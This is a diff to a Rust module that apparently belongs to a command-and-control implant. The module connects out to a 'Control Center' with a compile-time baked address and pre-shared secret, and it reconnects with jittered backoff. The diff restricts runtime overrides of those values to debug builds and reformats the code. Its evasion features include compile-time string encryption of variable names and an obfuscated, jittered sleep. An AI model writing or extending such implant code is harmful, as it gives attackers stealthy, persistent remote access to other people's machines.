@@ -4,16 +4,18 @@
 //! inbound connection from a console) and maintains a persistent session with
 //! exponential-backoff reconnection.
 //!
-//! # Address resolution (first match wins)
+//! # Address resolution
 //!
-//! 1. `ORCHESTRA_C` runtime environment variable (`host:port`).
-//! 2. `ORCHESTRA_C_ADDR` baked into the binary at compile time via the
-//!    Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation.
+//! Release builds use `ORCHESTRA_C_ADDR` baked into the binary at compile time
+//! via the Builder's `cargo build … ORCHESTRA_C_ADDR=<addr>` invocation. Debug
+//! builds may override it with the `ORCHESTRA_C` runtime environment variable
+//! to simplify local testing.
 //!
-//! # Secret resolution (first match wins)
+//! # Secret resolution
 //!
-//! 1. `ORCHESTRA_SECRET` runtime environment variable.
-//! 2. `ORCHESTRA_C_SECRET` baked in at compile time.
+//! Release builds use `ORCHESTRA_C_SECRET` baked in at compile time. Debug
+//! builds may override it with the `ORCHESTRA_SECRET` runtime environment
+//! variable for local testing.
 //!
 //! # TLS verification
 //!
@@ -23,17 +25,17 @@
 //! with publicly-trusted certificates.  Production deployments should always
 //! use certificate pinning.
 
+use crate::obfuscated_sleep::calculate_jittered_sleep;
 use anyhow::{anyhow, Result};
-use common::{CryptoSession, Message, Transport};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
+use common::{CryptoSession, Message, Transport};
 use log::{error, info, warn};
 use rustls::ClientConfig;
-use sysinfo::System;
 use std::sync::Arc;
+use sysinfo::System;
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
 use tokio_rustls::TlsConnector;
-use crate::obfuscated_sleep::calculate_jittered_sleep;
 use uuid::Uuid;
 
 // Compile-time constants injected by the Builder (may be absent in manual builds).
@@ -48,8 +50,12 @@ pub fn resolve_addr() -> Option<String> {
     #[cfg(debug_assertions)]
     {
         let raw = string_crypt::enc_str!("ORCHESTRA_C");
-        let key = std::str::from_utf8(&raw).unwrap_or("").trim_end_matches('\0');
-        if let Ok(v) = std::env::var(key) { return Some(v); }
+        let key = std::str::from_utf8(&raw)
+            .unwrap_or("")
+            .trim_end_matches('\0');
+        if let Ok(v) = std::env::var(key) {
+            return Some(v);
+        }
     }
     BAKED_ADDR.map(str::to_string)
 }
@@ -59,8 +65,12 @@ pub fn resolve_secret() -> Option<String> {
     #[cfg(debug_assertions)]
     {
         let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
-        let key = std::str::from_utf8(&raw).unwrap_or("").trim_end_matches('\0');
-        if let Ok(v) = std::env::var(key) { return Some(v); }
+        let key = std::str::from_utf8(&raw)
+            .unwrap_or("")
+            .trim_end_matches('\0');
+        if let Ok(v) = std::env::var(key) {
+            return Some(v);
+        }
     }
     BAKED_SECRET.map(str::to_string)
 }
@@ -89,7 +99,10 @@ fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
     let mut roots = rustls::RootCertStore::empty();
     let native = rustls_native_certs::load_native_certs();
     if !native.errors.is_empty() {
-        warn!("outbound-c: {} errors loading native root certs (continuing)", native.errors.len());
+        warn!(
+            "outbound-c: {} errors loading native root certs (continuing)",
+            native.errors.len()
+        );
     }
     for cert in native.certs {
         roots.add(cert).ok();
@@ -101,7 +114,12 @@ fn build_tls_client_config(cert_fp: Option<&str>) -> Result<ClientConfig> {
 
 /// Connect once, run the agent command loop until transport error or
 /// clean shutdown. Returns `Ok(())` on a clean `Shutdown` command.
-async fn connect_once(addr: &str, secret: &str, agent_id: &str, cert_fp: Option<&str>) -> Result<()> {
+async fn connect_once(
+    addr: &str,
+    secret: &str,
+    agent_id: &str,
+    cert_fp: Option<&str>,
+) -> Result<()> {
     info!("outbound-c: connecting to Control Center addr={addr} agent_id={agent_id}");
 
     let tcp = TcpStream::connect(addr).await?;
@@ -156,16 +174,16 @@ pub async fn run_forever() -> Result<()> {
     let addr = resolve_addr().ok_or_else(|| {
         anyhow!(
             "No Control Center address configured. \
-             Set the ORCHESTRA_C environment variable (host:port) \
-             or rebuild with ORCHESTRA_C_ADDR set (the Builder does this automatically)."
+             Rebuild with ORCHESTRA_C_ADDR set (the Builder does this automatically). \
+             Debug builds may also set ORCHESTRA_C at runtime."
         )
     })?;
 
     let secret = resolve_secret().ok_or_else(|| {
         anyhow!(
             "No pre-shared secret configured. \
-             Set the ORCHESTRA_SECRET environment variable \
-             or rebuild with ORCHESTRA_C_SECRET set."
+             Rebuild with ORCHESTRA_C_SECRET set. \
+             Debug builds may also set ORCHESTRA_SECRET at runtime."
         )
     })?;
 
